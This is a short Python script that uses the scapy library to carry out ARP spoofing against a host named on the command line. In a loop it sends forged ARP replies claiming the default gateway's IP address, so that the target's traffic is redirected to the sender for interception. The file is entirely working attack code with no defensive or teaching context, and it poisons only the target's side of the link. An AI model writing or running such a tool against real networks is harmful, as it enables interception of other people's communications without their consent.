# Program to perform man in the middle using scapy

from scapy.all import *
from threading import Thread
import sys
import time

# Function to perform arp requests in the interval of spam_interval
def man_in_the_middle(host, spam_interval):
    try:
        router_ip = conf.route.route("0.0.0.0")[2]
        while True:
            packet = ARP(op=2, pdst=host, psrc=router_ip)
            print(packet.summary())
            sendp(packet, verbose=False)
            time.sleep(spam_interval)
        
    except KeyboardInterrupt:
        pass

# Main function with 2 command line parameters
# First parameter is target
# Second parameter is spam interval(in sec)
if __name__ == '__main__':
    if len(sys.argv) < 3 or len(sys.argv) > 3:
        print("Invalid Arguments")
    else:
        host = sys.argv[1]
        spam_interval = int(sys.argv[2])
        man_in_the_middle(host, spam_interval)